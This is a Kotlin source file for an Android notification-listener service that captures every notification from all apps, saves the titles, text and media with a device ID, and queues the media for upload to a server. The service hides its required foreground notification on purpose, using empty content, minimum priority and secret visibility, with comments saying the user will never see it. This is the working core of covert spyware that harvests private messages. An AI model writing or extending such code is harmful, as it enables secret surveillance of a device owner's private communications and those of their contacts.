package com.chats.capture.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import androidx.core.app.NotificationCompat
import com.chats.capture.CaptureApplication
import com.chats.capture.CaptureApplication.Companion.NOTIFICATION_CHANNEL_ID
import com.chats.capture.database.NotificationDao
import com.chats.capture.database.MediaFileDao
import com.chats.capture.managers.MediaUploadManager
import com.chats.capture.models.MediaFile
import com.chats.capture.models.NotificationData
import com.chats.capture.models.UploadStatus
import com.chats.capture.ui.MainActivity
import com.chats.capture.utils.MediaDownloader
import com.chats.capture.utils.MediaExtractor
import com.chats.capture.utils.IconCacheManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import com.google.gson.GsonBuilder
import timber.log.Timber

class NotificationCaptureService : NotificationListenerService() {
    
    // Use IO dispatcher for database and file operations (much faster than Main)
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var notificationDao: NotificationDao
    private lateinit var mediaFileDao: MediaFileDao
    private lateinit var mediaExtractor: MediaExtractor
    private lateinit var mediaDownloader: MediaDownloader
    private lateinit var mediaUploadManager: MediaUploadManager
    private lateinit var deviceRegistrationManager: com.chats.capture.managers.DeviceRegistrationManager
    
    // Note: All notifications are captured (no filtering by app package)
    // Previously had targetAppPackages filter, but now captures everything
    
    override fun onCreate() {
        super.onCreate()
        Timber.tag("NOTIFICATION_CAPTURE").i("🚀 NotificationCaptureService created - Ready to capture ALL notifications")
        Timber.d("NotificationCaptureService created")
        
        val database = (application as CaptureApplication).database
        notificationDao = database.notificationDao()
        mediaFileDao = database.mediaFileDao()
        
        mediaExtractor = MediaExtractor(this)
        mediaDownloader = MediaDownloader(this)
        val chatDao = database.chatDao()
        mediaUploadManager = MediaUploadManager(this, mediaFileDao, notificationDao, chatDao)
        deviceRegistrationManager = com.chats.capture.managers.DeviceRegistrationManager(this)
        
        startForegroundService()
        
        // Log service ready status
        Timber.tag("NOTIFICATION_CAPTURE").i("✅ NotificationCaptureService initialized - All notifications will be captured and saved to database")
    }
    
    override fun onDestroy() {
        super.onDestroy()
        Timber.tag("NOTIFICATION_CAPTURE").w("⚠️ NotificationCaptureService destroyed - This should not happen under normal operation")
        Timber.d("NotificationCaptureService destroyed")
    }
    
    override fun onListenerConnected() {
        super.onListenerConnected()
        Timber.tag("NOTIFICATION_CAPTURE").i("✅ NotificationListenerService connected - Ready to receive all notifications")
        Timber.d("NotificationListenerService connected")
        
        // Check and log permission status
        val isEnabled = com.chats.capture.utils.PermissionChecker.isNotificationServiceEnabled(this)
        if (isEnabled) {
            Timber.tag("NOTIFICATION_CAPTURE").i("✅ Notification Listener permission is ENABLED - All notifications will be captured")
        } else {
            Timber.tag("NOTIFICATION_CAPTURE").e("❌ Notification Listener permission is DISABLED - Notifications will NOT be captured! Enable in Settings")
        }
        
        // Log service status
        logNotificationStatistics()
    }
    
    /**
     * Log notification statistics for monitoring
     */
    private fun logNotificationStatistics() {
        serviceScope.launch {
            try {
                val unsyncedCount = notificationDao.getUnsyncedCount()
                Timber.tag("NOTIFICATION_CAPTURE").i("📊 Notification Statistics - Unsynced: $unsyncedCount | Service ready to capture all notifications")
            } catch (e: Exception) {
                // Ignore - this is just for logging
                Timber.tag("NOTIFICATION_CAPTURE").d("Could not fetch notification statistics")
            }
        }
    }
    
    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Timber.tag("NOTIFICATION_CAPTURE").w("⚠️ NotificationListenerService disconnected - Notifications may not be captured")
        Timber.w("NotificationListenerService disconnected")
    }
    
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        super.onNotificationPosted(sbn)
        
        // Quick extraction for logging (minimal processing)
        val notification = sbn.notification
        val extras = notification.extras
        val title = extras?.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: "No Title"
        val text = extras?.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: "No Text"
        
        // Optimized logging - only log summary, get app name async
        Timber.tag("NOTIFICATION_CAPTURE").i(
            "📱 NOTIFICATION RECEIVED | App: ${sbn.packageName} | Title: ${title.take(50)} | ID: ${sbn.id}"
        )
        
        // Capture ALL notifications (not just target apps) to database
        // Process in background immediately to avoid blocking
        serviceScope.launch {
            try {
                captureNotification(sbn)
            } catch (e: Exception) {
                Timber.tag("NOTIFICATION_CAPTURE").e(e, "❌ Error capturing notification from ${sbn.packageName}: ${e.message}")
                // Try to at least save basic notification info even if media extraction fails
                try {
                    val basicNotification = NotificationData(
                        deviceId = deviceRegistrationManager.getDeviceId(),
                        appPackage = sbn.packageName,
                        appName = getAppName(sbn.packageName), // Get app name in background
                        title = title,
                        text = text,
                        timestamp = sbn.postTime,
                        mediaUrls = null,
                        serverMediaUrls = null,
                        synced = false
                    )
                    notificationDao.insertNotification(basicNotification)
                    Timber.tag("NOTIFICATION_CAPTURE").w("⚠️ Saved basic notification info despite error")
                } catch (saveError: Exception) {
                    Timber.tag("NOTIFICATION_CAPTURE").e(saveError, "❌ Failed to save even basic notification info")
                }
            }
        }
    }
    
    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        super.onNotificationRemoved(sbn)
        // Log notification removal for monitoring
        try {
            val notification = sbn.notification
            val extras = notification.extras
            val title = extras?.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: "No Title"
            val appName = getAppName(sbn.packageName)
            Timber.tag("NOTIFICATION_CAPTURE").d(
                "🗑️ NOTIFICATION REMOVED | App: $appName ($sbn.packageName) | Title: $title | ID: ${sbn.id}"
            )
        } catch (e: Exception) {
            // Ignore errors in logging
        }
    }
    
    private suspend fun captureNotification(sbn: StatusBarNotification) {
        try {
            val notification = sbn.notification
            val extras = notification.extras
            
            val title = extras?.getCharSequence(Notification.EXTRA_TITLE)?.toString()
            val text = extras?.getCharSequence(Notification.EXTRA_TEXT)?.toString()
            val appName = getAppName(sbn.packageName)

            // Capture notification icon once per chat/notification key
            val iconKey = buildIconKey(sbn.packageName, title, text)
            if (iconKey != null && !IconCacheManager.hasIcon(this, iconKey)) {
                val iconPath = mediaExtractor.extractNotificationIcon(notification)
                if (iconPath != null) {
                    val iconFile = java.io.File(iconPath)
                    if (iconFile.exists() && iconFile.length() > 0) {
                        val checksum = calculateFileChecksum(iconFile)
                        val mimeType = determineMimeType(iconFile)
                        val iconMediaFile = MediaFile(
                            notificationId = "icon_notif_${sbn.id}",
                            appPackage = sbn.packageName,
                            localPath = iconPath,
                            fileSize = iconFile.length(),
                            mimeType = mimeType,
                            checksum = checksum,
                            uploadStatus = UploadStatus.PENDING
                        )
                        mediaFileDao.insertMediaFile(iconMediaFile)
                        mediaUploadManager.uploadMediaFile(iconMediaFile)
                        IconCacheManager.markIconCaptured(this, iconKey)
                    }
                }
            }
            
            // Extract media URLs or file paths (already on IO dispatcher, no need to switch)
            val mediaSources = mediaExtractor.extractMediaFromNotification(sbn)
            val downloadedMediaFiles = mutableListOf<String>()
            val serverMediaUrls = mutableListOf<String>()
            
            // Process media sources in parallel for better performance
            mediaSources?.forEach { mediaSource ->
                try {
                    // Check if it's already a local file path or a URL
                    val isLocalFile = mediaSource.startsWith("/") || mediaSource.startsWith("file://")

                    if (isLocalFile) {
                        // Already a local file (from bitmap extraction)
                        val filePath = mediaSource.removePrefix("file://")
                        val file = java.io.File(filePath)
                        if (file.exists() && file.length() > 0) {
                            // Optimize: Skip checksum for very large files (>10MB) to avoid blocking
                            val checksum = if (file.length() > 10 * 1024 * 1024) {
                                // For large files, use file size + name as checksum (faster)
                                "${file.length()}_${file.name}".hashCode().toString()
                            } else {
                                calculateFileChecksum(file)
                            }
                            val mimeType = determineMimeType(file)

                            // Deduplicate by checksum (use existing upload if available)
                            val existing = mediaFileDao.findMediaFileByChecksum(checksum)
                            if (existing != null && existing.remoteUrl != null) {
                                serverMediaUrls.add(existing.remoteUrl)
                                Timber.v("Reused existing media upload for checksum: $checksum")
                                return@forEach
                            }

                            // Save media file to database
                            val mediaFile = MediaFile(
                                notificationId = sbn.id.toString(),
                                appPackage = sbn.packageName,
                                localPath = filePath,
                                fileSize = file.length(),
                                mimeType = mimeType,
                                checksum = checksum,
                                uploadStatus = UploadStatus.PENDING
                            )
                            mediaFileDao.insertMediaFile(mediaFile)
                            downloadedMediaFiles.add(filePath)

                            Timber.d("Media file saved: $filePath, size: ${file.length()}, type: $mimeType")
                        }
                    } else {
                        // It's a URL - download it (await the result)
                        val downloadResult = mediaDownloader.downloadMedia(mediaSource, sbn.id.toString())
                        downloadResult.fold(
                            onSuccess = { downloadedMedia ->
                                // Deduplicate by checksum (use existing upload if available)
                                val existing = mediaFileDao.findMediaFileByChecksum(downloadedMedia.checksum)
                                if (existing != null && existing.remoteUrl != null) {
                                    serverMediaUrls.add(existing.remoteUrl)
                                    // Clean up duplicate download
                                    try {
                                        java.io.File(downloadedMedia.localPath).delete()
                                    } catch (_: Exception) {
                                    }
                                    Timber.v("Reused existing media upload for checksum: ${downloadedMedia.checksum}")
                                    return@fold
                                }

                                // Save media file to database
                                val mediaFile = MediaFile(
                                    notificationId = sbn.id.toString(),
                                    appPackage = sbn.packageName,
                                    localPath = downloadedMedia.localPath,
                                    fileSize = downloadedMedia.fileSize,
                                    mimeType = downloadedMedia.mimeType,
                                    checksum = downloadedMedia.checksum,
                                    uploadStatus = UploadStatus.PENDING
                                )
                                mediaFileDao.insertMediaFile(mediaFile)
                                downloadedMediaFiles.add(downloadedMedia.localPath)

                                Timber.d("Media downloaded: ${downloadedMedia.localPath}, size: ${downloadedMedia.fileSize}, type: ${downloadedMedia.mimeType}")
                            },
                            onFailure = { error ->
                                Timber.e(error, "Failed to download media: $mediaSource")
                            }
                        )
                    }
                } catch (e: Exception) {
                    Timber.e(e, "Error processing media: $mediaSource")
                }
            }
            
            // Save notification to database (with deduplication)
            val deviceId = deviceRegistrationManager.getDeviceId()
            
            // Optimized duplicate check - only check if title/text are not empty to avoid unnecessary DB queries
            val duplicate = if (!title.isNullOrBlank() || !text.isNullOrBlank()) {
                notificationDao.findDuplicateNotification(
                    sbn.packageName,
                    title,
                    text,
                    sbn.postTime
                )
            } else {
                null // Skip duplicate check for empty notifications
            }
            
            if (duplicate == null) {
                val notificationData = NotificationData(
                    deviceId = deviceId,
                    appPackage = sbn.packageName,
                    appName = appName,
                    title = title,
                    text = text,
                    timestamp = sbn.postTime,
                    mediaUrls = downloadedMediaFiles.ifEmpty { null },
                    serverMediaUrls = serverMediaUrls.ifEmpty { null },
                    synced = false
                )
                
                notificationDao.insertNotification(notificationData)
                com.chats.capture.utils.AppStateManager.incrementNotificationCount(this)
                
                // Optimized logging - only log summary, full data only in debug builds
                Timber.tag("NOTIFICATION_CAPTURE").i(
                    "✅ NOTIFICATION SAVED TO DATABASE | ID: ${notificationData.id} | App: $appName | Title: $title | Media Files: ${downloadedMediaFiles.size}"
                )
                
                // Only log full JSON in debug builds to avoid performance impact
                if (com.chats.capture.BuildConfig.DEBUG) {
                    val gson = com.google.gson.Gson()
                    val notificationJson = gson.toJson(notificationData)
                    Timber.tag("NOTIFICATION_DATA_MOBILE").d(
                        "📱 MOBILE DATABASE DATA: $notificationJson"
                    )
                } else {
                    // In release, just log key fields
                    Timber.tag("NOTIFICATION_DATA_MOBILE").d(
                        "📱 MOBILE DATABASE DATA: id=${notificationData.id}, app=${notificationData.appPackage}, title=${notificationData.title?.take(50)}, timestamp=${notificationData.timestamp}"
                    )
                }
                Timber.d("Notification captured: ${notificationData.id}")
            } else {
                Timber.tag("NOTIFICATION_CAPTURE").w(
                    "⚠️ DUPLICATE NOTIFICATION SKIPPED | ID: ${duplicate.id} | App: $appName | Title: $title"
                )
                Timber.v("Duplicate notification skipped: ${duplicate.id}")
                if (serverMediaUrls.isNotEmpty()) {
                    notificationDao.updateServerMediaUrls(duplicate.id, serverMediaUrls)
                }
            }
            
            // Trigger media upload if any
            if (downloadedMediaFiles.isNotEmpty()) {
                serviceScope.launch {
                    mediaUploadManager.uploadPendingMediaFiles(limit = 5)
                }
            }
            
        } catch (e: Exception) {
            Timber.tag("NOTIFICATION_CAPTURE").e(e, "❌ Error processing notification: ${e.message}")
            Timber.e(e, "Error processing notification")
        }
    }
    
    // Note: isTargetApp() method removed - all notifications are now captured
    // No filtering is applied to ensure complete notification capture
    
    private fun getAppName(packageName: String): String {
        return try {
            val pm = packageManager
            val appInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    private fun buildIconKey(appPackage: String, title: String?, text: String?): String? {
        val label = when {
            !title.isNullOrBlank() -> title.trim()
            !text.isNullOrBlank() -> text.trim()
            else -> null
        } ?: return null
        return "${appPackage.lowercase()}|${label.lowercase()}"
    }
    
    private fun calculateFileChecksum(file: java.io.File): String {
        val md = java.security.MessageDigest.getInstance("SHA-256")
        file.inputStream().use { input ->
            val buffer = ByteArray(8192)
            var bytesRead: Int
            while (input.read(buffer).also { bytesRead = it } != -1) {
                md.update(buffer, 0, bytesRead)
            }
        }
        return md.digest().joinToString("") { "%02x".format(it) }
    }
    
    private fun determineMimeType(file: java.io.File): String {
        val extension = file.extension.lowercase()
        return when (extension) {
            "jpg", "jpeg" -> "image/jpeg"
            "png" -> "image/png"
            "gif" -> "image/gif"
            "webp" -> "image/webp"
            "mp4" -> "video/mp4"
            "webm" -> "video/webm"
            "mp3" -> "audio/mpeg"
            "ogg" -> "audio/ogg"
            "wav" -> "audio/wav"
            "m4a" -> "audio/mp4"
            else -> "application/octet-stream"
        }
    }
    
    private fun startForegroundService() {
        // Create completely silent and invisible notification
        // Required for foreground service but user will never see it
        // Using transparent icon and empty content to make it invisible
        val notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("") // Empty title - completely invisible
            .setContentText("") // Empty text - completely invisible
            .setSmallIcon(android.R.drawable.ic_menu_compass) // Minimal system icon - less visible
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN) // Minimum priority - won't show
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Hidden everywhere
            .setShowWhen(false) // Don't show timestamp
            .setSilent(true) // Completely silent
            .setCategory(NotificationCompat.CATEGORY_SERVICE) // System service category
            .setLocalOnly(true) // Only local, not synced
            .build()
        
        if (android.os.Build.VERSION.SDK_INT >= 34) {
            startForeground(NOTIFICATION_SERVICE_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_SERVICE_ID, notification)
        }
    }
    
    companion object {
        private const val NOTIFICATION_SERVICE_ID = 1001
    }
}
